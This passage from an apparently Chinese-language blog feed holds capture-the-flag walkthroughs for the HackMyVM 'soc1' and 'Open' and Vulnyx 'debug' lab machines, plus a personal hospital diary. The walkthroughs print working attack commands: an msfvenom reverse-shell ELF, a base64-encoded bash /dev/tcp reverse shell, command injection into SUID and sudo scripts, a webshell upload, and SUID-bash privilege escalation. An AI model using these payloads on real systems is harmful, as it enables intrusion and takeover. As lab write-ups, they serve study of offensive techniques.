jenkins on SOC:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jenkins may run the following commands on SOC:<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk search *<br>    (ALL) NOPASSWD: /opt/splunk/bin/splunk restart<br><br></code></pre></td></tr></table></figure><h3 id="GetSplunk-复现"><a href="#GetSplunk-复现" class="headerlink" title="GetSplunk(复现)"></a>GetSplunk(复现)</h3><hr><p>通过查找相关cve得到一个poc</p><p><a href="https://github.com/nathan31337/Splunk-RCE-poc">nathan31337&#x2F;Splunk-RCE-poc</a></p><p>同时该漏洞相关的web.conf 是可写的。</p><p>但是得先知道splunk的密码。</p><p>通过爆破（kali自带字典）得到splunk的账密为splunk:splunk123</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_PvrbcCrVbe.png"></p><p>先改好配置之后再重启，重启得花些时间让web服务跑起来。</p><p><img src="/2025/11/06/HackMyvm-soc1/vmware_PHX4QRbrnC.png"></p><p>由于splunk可写，直接把相关命令替换成提权的</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">rm</span> /opt/splunk/bin/splunk<br><span class="hljs-built_in">rm</span>: remove write-protected regular file <span class="hljs-string">&#x27;/opt/splunk/bin/splunk&#x27;</span>? <span class="hljs-built_in">yes</span><br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;chmod +s /bin/bash&quot;</span> &gt; /opt/splunk/bin/splunk<br>splunk@SOC:/opt/splunk/etc/apps/search/bin$ <span class="hljs-built_in">chmod</span> +x /opt/splunk/bin/splunk<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">jenkins@SOC:/opt/splunk/etc/system/default$ sudo /opt/splunk/bin/splunk restart<br>jenkins@SOC:/opt/splunk/etc/system/default$ bash -p<br>bash-5.0# id<br>uid=1001(jenkins) gid=1001(jenkins) euid=0(root) egid=0(root) groups=0(root),1001(jenkins)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>入院小记</title>
    <link href="/2025/11/04/%E5%85%A5%E9%99%A2%E5%B0%8F%E8%AE%B0/"/>
    <url>/2025/11/04/%E5%85%A5%E9%99%A2%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>入院三星期有余。</p><p>医院里，做什么的都有。同房的病友一号姓石，家里大概是做房地产生意的，每次做完治疗回来都会看见他愣愣的坐在床上，不知道在想什么。后来我知道他以前得过脑出血，走路总有些一瘸一拐，据他说，本来好了，但是自己停药，又给弄进来了。在前几天，还有过不想活了的想法，据说是嫌自己这条腿没用，把护士吓得直劝他，还让人把老伴喊过来陪。他总说，这病只要不去想他，自然就好了，我深以为然。</p><p>另一个病友姓苗，平面设计出身，据他说我们学校好多学生实习都去他的公司做过设计，不知是真是假。</p><p>此人是个天生的外向性格，似乎不管到哪都能和人打成一片，据说还陪着领导去了几次市里的会所，每次看他谈天说地的样，心里就会想，怎么他这样的人也落到了和我一起？后面听他说，是吃饭出了问题，望着碗筷就会焦虑，最后整的只能吃流食续命。不过医院20元的大锅饭，他照样吃的爽快，大锅饭什么都有，刚入院的那一餐豆芽粉丝里面甚至有些许微量蛋白质，我也只能摇摇头挑出来扔掉。在住院时，大家总会扯闲篇，而他总会第一个开启话题，他的笑声很独特，有点像鹅，咕嘎咕嘎，加上留着分头，俨然一副活泼科员的模样，讲话总是操他奶奶起手，似乎全天下的奶奶都被他一人操遍了。</p><p>除了我，还有先后有两位高中生搬进来。搬进来时，老石和老苗都说年轻人，这病不碍事，恢复的快，不知道我算不算年轻人。这两位没什么好说的。医院里据传还有人信耶稣，入院的时候医生也问过我信不信教，我是不信什么的，轮回转世之类的说法对我也没吸引力。我认为死后只有虚无，这也是我唯一能接受的死后世界观点，其他观点都有些无聊了，只有永恒的永恒虚无才显得不那么无聊，或者，有那么一点平静，所以医生问我怕死和有条件是否会接受死亡的问题时，我都只是摇摇头，说我不知道。我确实不知道，必须要把我放在那个情境中，我才会知道怎么做。</p><p>医院里没有网，除去用手机刷流量之外，剩下的时光只有去4楼做特殊治疗算是比较有意思的，其余的时光大都在等待理疗和睡觉中度过。在医院我做的最多的事就是等待，我不知道我是不是学会了等待，只是每天感觉可以忍受的时间多了一些，坐着看着治疗结束的时间变快了些。</p><p>4楼的特殊治疗有k歌房，大家总是点一些经典的校园歌曲，或者八九十年代，零零年代的流行乐，这大概也和入院患者的年龄有关，大都在三十岁往上。昨天护士说，我总是点民谣，我没想到她还会留意这一点。民谣我认为是所有人都适合听的，不管什么年龄都能听出一点味道在里面。说是民谣，其实也就是那几首歌，《南山南》《成都》《程艾影》，刚去的时候还点了《炉心融解》，不过我发现没有假名注音，只能跟着瞎唱。点来点去，点的最多的还是《程艾影》，一路望，跌跌撞，午夜流星何去何往，路海长，青夜旷，越过群山追斜阳。不知为什么，我觉得它的歌词唱起来特别好听，是和别的民谣不一样的好听。</p>]]></content>
    
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vulnyx-debug复盘</title>
    <link href="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/"/>
    <url>/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/</url>
    
    <content type="html"><![CDATA[<p>经历了很多事情，接近死亡，又被救回来，住了院，每天理疗，吃药，看着身边的病友来来往往。</p><p>检查做完了先重拾一下靶机吧</p><p>靶机ip：192.168.56.169</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.169 -p- --min-rate=1000 -A<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 00:16 EDT<br>Nmap scan report for bogon (192.168.56.169)<br>Host is up (0.0011s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)<br>|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)<br>|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.61 ((Debian))<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>|_http-server-header: Apache/2.4.61 (Debian)<br>8080/tcp  open  http    Apache httpd 2.4.61 ((Debian))<br>|_http-open-proxy: Proxy might be redirecting requests<br>|_http-server-header: Apache/2.4.61 (Debian)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>20500/tcp open  unknown<br>MAC Address: 08:00:27:75:CB:49 (Oracle VirtualBox virtual NIC)<br>Device type: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   1.07 ms bogon (192.168.56.169)<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: 1 IP address (1 host up) scanned in 24.38 seconds<br><br></code></pre></td></tr></table></figure><p>之后访问80端口和8080端口看到显示如下界面。</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_9uhyInU2oh.png"></p><p>之后尝试dirsearch，ferobuster等多种目录爆破工具爆破无果，故放弃尝试，决定先去看看20500端口是什么，网上没有搜到关于端口的信息，推测是个自定义服务。</p><p>curl一下仍然没有反应，查看UDP服务。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap -sU --min-rate 1000 192.168.56.169<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-27 00:23 EDT<br>Nmap scan report for bogon (192.168.56.169)<br>Host is up (0.00070s latency).<br>Not shown: 986 open|filtered udp ports (no-response)<br>PORT      STATE  SERVICE<br>161/udp   open   snmp<br>500/udp   closed isakmp<br>517/udp   closed talk<br>623/udp   closed asf-rmcp<br>998/udp   closed puparp<br>1434/udp  closed ms-sql-m<br>2148/udp  closed veritas-ucl<br>5353/udp  closed zeroconf<br>17939/udp closed unknown<br>21212/udp closed unknown<br>24606/udp closed unknown<br>42577/udp closed unknown<br>47808/udp closed bacnet<br>49185/udp closed unknown<br>MAC Address: 08:00:27:75:CB:49 (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds<br><br><br></code></pre></td></tr></table></figure><p>发现snmp服务是开着的，准备枚举。</p><p>但是默认的public用不了，使用onesixtyone爆破。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">snmp-check 192.168.56.169<br>snmp-check v1.9 - SNMP enumerator<br>Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)<br><br>[+] Try to connect to 192.168.56.169:161 using SNMPv1 and community &#x27;public&#x27;<br><br>[!] 192.168.56.169:161 SNMP request timeout<br><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">onesixtyone</span> -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <span class="hljs-number">192.168.56.169</span> -w <span class="hljs-number">100</span><br><span class="hljs-attribute">Scanning</span> <span class="hljs-number">1</span> hosts, <span class="hljs-number">120</span> communities<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">56</span>.<span class="hljs-number">169</span><span class="hljs-meta"> [network] Linux debug 5.10.0-32-amd64 #1 SMP Debian 5.10.223-1 (2024-08-10) x86_64</span><br></code></pre></td></tr></table></figure><p>找到目标系统的 SNMP 社区字符串为 <strong><code>network</code></strong>，继续实以smnp-check，发现gdb服务，并映射于外网的20500端口上。（顺便发现内网还开了个端口9000）</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_z5nH0VHnrJ.png"></p><h3 id="GetKiller"><a href="#GetKiller" class="headerlink" title="GetKiller"></a>GetKiller</h3><hr><p>构造恶意elf文件准备上传。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 PrependFork=true -f elf -o binary.elf<br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs gradle">(gdb) target extended-remote <span class="hljs-number">192.168</span>.<span class="hljs-number">56.169</span>:<span class="hljs-number">20500</span><br>Remote debugging using <span class="hljs-number">192.168</span>.<span class="hljs-number">56.169</span>:<span class="hljs-number">20500</span><br>Reading <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <span class="hljs-keyword">from</span> remote target...<br>Reading symbols <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span>...<br>(No debugging symbols found in target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span>)<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading symbols <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>...<br>(No debugging symbols found in target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span>)<br><span class="hljs-number">0</span>x00007ffff7fd3090 in ?? () <span class="hljs-keyword">from</span> target:<span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span><br>(gdb) remote put binary.elf <span class="hljs-regexp">/tmp/</span>binary.elf<br>Successfully sent <span class="hljs-keyword">file</span> <span class="hljs-string">&quot;binary.elf&quot;</span>.<br>(gdb) set remote exec-<span class="hljs-keyword">file</span> <span class="hljs-regexp">/tmp/</span>binary.elf<br>(gdb) run<br>The program being debugged has been started already.<br>Start it <span class="hljs-keyword">from</span> the beginning? (y or n) y<br>Starting program: target:<span class="hljs-regexp">/usr/</span>bin/<span class="hljs-keyword">true</span> <br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>Reading <span class="hljs-regexp">/lib64/</span>ld-linux-x86-<span class="hljs-number">64</span>.so.<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> remote target...<br>[Detaching after fork <span class="hljs-keyword">from</span> child process <span class="hljs-number">993</span>]<br>[Inferior <span class="hljs-number">1</span> (process <span class="hljs-number">992</span>) exited normally]<br>(gdb) <br><br></code></pre></td></tr></table></figure><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_DpcBMuo20I.png"></p><p>之后写个公钥方便进去。</p><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><p>用chisel把刚刚的9000端口转发出来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">killer@debug:/home/killer$ chmod +x chisel <br>killer@debug:/home/killer$ cat user.txt <br>killer@debug:/home/killer$ chisel client 192.168.56.104:9999 R:9000:127.0.0.1:9000<br>2025/10/27 05:58:23 client: Connecting to ws://192.168.56.104:9999<br>2025/10/27 05:58:23 client: Connected (Latency 956.899µs)<br></code></pre></td></tr></table></figure><p>网页访问提示method not allowed。</p><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/vmware_5SPsj9Q9Qr.png"></p><p>换成PUT方法试一试。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl 127.0.0.1:9000 -X PUT<br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;id_1761541695&quot;,&quot;size&quot;:0&#125;                                                                                                                                                           <br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─# curl 127.0.0.1:9000 -X PUT<br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;id_1761541699&quot;,&quot;size&quot;:0&#125;  <br></code></pre></td></tr></table></figure><p>看起来可以传文件，开始想着传马，但是他会把文件名随机。</p><p>这里想了好久最后去看老大的复盘视频才知道有一个参数要fuzz，是name。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -s 127.0.0.1:9000/?name=3.php -X PUT     <br>&#123;&quot;status&quot;:&quot;ok&quot;,&quot;filename&quot;:&quot;3.php&quot;,&quot;size&quot;:0&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/10/27/Vulnyx-debug%E5%A4%8D%E7%9B%98/AntSword_8eNzrEUAjh.png"></p><p>传个一句话木马连上去就root了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>Vulnyx</tag>
      
      <tag>域</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackMyVM-Open</title>
    <link href="/2025/08/03/HackMyVM-Open/"/>
    <url>/2025/08/03/HackMyVM-Open/</url>
    
    <content type="html"><![CDATA[<p>靶机IP：192.168.56.130</p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">nmap 192.168.56.130<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-03 08:23 EDT<br>Nmap scan report for open.dsz (192.168.56.130)<br>Host is up (0.00048s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:5E:25:AE (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds<br></code></pre></td></tr></table></figure><p>访问80端口提示跳转域名open .dsz , 放到host里。</p><h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><hr><p><img src="/2025/08/03/HackMyVM-Open/vmware_1P3r6JLm4W.png"></p><p>访问得到一个url界面，提示有RFI（远程文件包含）</p><p>在攻击机上起个http服务（python3 -m http 80）反弹shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">cat <span class="hljs-number">1</span>.php <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&quot;printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvNDQ0NCAwPiYxKSAm|base64 -d|bash&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br>┌──(root㉿kali)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ./penelope.py</span><br>[+] Listening <span class="hljs-keyword">for</span> reverse shells on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4444</span> →  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> • <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span><br>➤  🏠 Main <span class="hljs-title function_ invoke__">Menu</span> (m) 💀 <span class="hljs-title function_ invoke__">Payloads</span> (p) 🔄 <span class="hljs-title function_ invoke__">Clear</span> (Ctrl-L) 🚫 <span class="hljs-title function_ invoke__">Quit</span> (q/Ctrl-C)<br>[+] Got reverse shell <span class="hljs-keyword">from</span> Open-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.130</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [<span class="hljs-number">1</span>], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/Open~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.130</span>_Linux_x86_64/<span class="hljs-number">2025_08_03</span>-<span class="hljs-number">06_46_03</span>-<span class="hljs-number">181</span>.log 📜<br><br>wwwdata能直接读userflag，很良心<br><br></code></pre></td></tr></table></figure><h3 id="GetMiao"><a href="#GetMiao" class="headerlink" title="GetMiao"></a>GetMiao</h3><hr><p>惯例看文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Open:/opt$ find / -type f -perm -4000 2&gt;/dev/null<br>/usr/bin/chsh<br>/usr/bin/chfn<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/bin/mount<br>/usr/bin/su<br>/usr/bin/umount<br>/usr/bin/pkexec<br>/usr/bin/sudo<br>/usr/bin/passwd<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/libexec/polkit-agent-helper-1<br>/opt/echo<br><br></code></pre></td></tr></table></figure><p>cat了一下这个echo发现存在命令注入点。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell">www-data@Open:/opt$ ./echo &quot;&#x27;; printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvOTk5OSAwPiYxKSAm|base64 -d|bash; echo &#x27;&quot;<br>执行命令: echo &#x27;[用户输入]: &#x27;; printf KGJhc2ggPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDQvOTk5OSAwPiYxKSAm|base64 -d|bash; echo &#x27;&#x27;<br>[用户输入]: <br><br>───────────────────────────────────────────────────────────────────────────────<br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got reverse shell from Open-192.168.56.130-Linux-x86_64 😍 Assigned SessionID &lt;1&gt;<br>[+] Attempting to upgrade shell to PTY...<br>[+] Shell upgraded successfully using /usr/bin/python3! 💪<br>[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 <br>[+] Logging to /root/.penelope/Open~192.168.56.130_Linux_x86_64/2025_08_03-07_29_25-362.log 📜<br>────────────────────────────────────────────────────────────────────────────────────────────────────────<br><br>之后写个公钥方便进去。<br></code></pre></td></tr></table></figure><h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><hr><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell">miao@Open:~$ sudo -l<br>Matching Defaults entries for miao on Open:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User miao may run the following commands on Open:<br>    (ALL) NOPASSWD: /opt/hello.sh<br>miao@Open:~$ sudo /opt/hello.sh dsz<br>miao@Open:~$ cat /opt/hello.sh<br>PATH=/usr/bin<br><br>[ -n &quot;$1&quot; ] || exit 1<br>[ &quot;$1&quot; = &quot;dsz&quot; ] &amp;&amp; exit 2<br><span class="hljs-meta prompt_">#</span><span class="language-bash">[ <span class="hljs-variable">$1</span> = <span class="hljs-string">&quot;dsz&quot;</span> ] &amp;&amp; <span class="hljs-built_in">cat</span> /root/password.txt | <span class="hljs-built_in">md5sum</span> | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span></span><br>[ $1 = &quot;dsz&quot; ] &amp;&amp; cat /root/password.txt<br><br>echo &quot;Goodbye!&quot;<br><br></code></pre></td></tr></table></figure><p>这里也存在命令注入点，最后的$1没用双引号包裹。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> /opt/hello.sh <span class="hljs-string">&quot;x -o dsz&quot;</span><br>6cd1f22e65d26246530ff7a2528144e3<br>Goodbye!<br><br></code></pre></td></tr></table></figure><p>可以使用这样的逻辑判断绕过，也有更简单的方案直接加个空格就可以。</p><p>拿到md5后尝试了很长时间也没有爆破成功，这里回看之前的脚本，发现脚本给出md5的方式是通过cat，所以md5末尾会存在一个换行符。（echo加参数-n输出不带换行符)</p><p><img src="/2025/08/03/HackMyVM-Open/vmware_nvqzMhlQXH.png"></p><p>用python脚本爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-comment"># 配置参数</span><br>DICTIONARY_PATH = <span class="hljs-string">&#x27;rockyou.txt&#x27;</span><br>TARGET_HASH = <span class="hljs-string">&#x27;6cd1f22e65d26246530ff7a2528144e3&#x27;</span><br>MAX_THREADS = <span 